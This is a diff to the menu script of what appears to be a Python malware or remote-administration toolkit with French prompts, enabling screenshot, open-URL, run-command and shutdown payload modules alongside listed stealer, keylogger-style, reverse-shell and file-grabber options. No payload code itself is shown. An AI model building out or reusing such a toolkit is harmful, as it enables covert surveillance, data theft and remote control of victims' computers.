@@ -1,12 +1,12 @@
 from colorama import Fore, Style
 import os 
 from modules.payload.clipboard import clipboard_module
-#from modules.payload.screenshot import screenshot_module
+from modules.payload.screenshot import screenshot_module
 #from modules.payload.dirlist import directory_listing_module
 #from modules.payload.filegrab import file_grabber_module
 #from modules.payload.keybcontrol import keyboard_controller_module
 #from modules.payload.networkinfo import network_info_module
-#from modules.payload.openurl import open_url_module
+from modules.payload.openurl import open_url_module
 #from modules.payload.porthammer import port_hammer_module
 #from modules.payload.processview import process_view_module
 #from modules.payload.restart import restart_pc_module
@@ -14,7 +14,8 @@ from modules.payload.clipboard import clipboard_module
 #from modules.payload.reverseshell import reverse_shell_module
 #from modules.payload.rmdir import remove_directory_module
 #from modules.payload.rmscript import remove_file_module
-#from modules.payload.runcmd import run_command_module
+from modules.payload.runcmd import runcmd_module
+from modules.payload.shutdown import shutdown_module
 #from modules.payload.steal import stealer_module
 #from modules.payload.voicerec import voice_record_module
 #from modules.payload.wallpaper import change_wallpaper_module
@@ -62,12 +63,12 @@ Appuyez sur Entrée pour continuer...
 
     payloads = [
         ("Clipboard", clipboard_module),
-        ("Screenshot", None),
+        ("Screenshot", screenshot_module),
         ("Directory listing", None),
         ("File Grabber", None),
         ("Keyboard controller", None),
         ("Network info", None),
-        ("Open url", None),
+        ("Open url", open_url_module),
         ("Port Hammer", None),
         ("Process View", None),
         ("Restart PC", None),
@@ -75,7 +76,8 @@ Appuyez sur Entrée pour continuer...
         ("Reverse Shell", None),
         ("Remove Directory", None),
         ("Remove file", None),
-        ("Run Command on terminal", None),
+        ("Run Command on terminal", runcmd_module),
+        ("Shutdown", shutdown_module),
         ("Stealer", None),
         ("Voice record", None),
         ("Change wallpaper", None),
@@ -206,5 +208,4 @@ Appuyez sur Entrée pour continuer...
         else:
             print(Fore.RED + "Commande inconnue. Veuillez entrer 'payload', 'capture', 'scan' ou 'exit'." + Style.RESET_ALL)
 
-if __name__ == "__main__":
-    console()
+console()
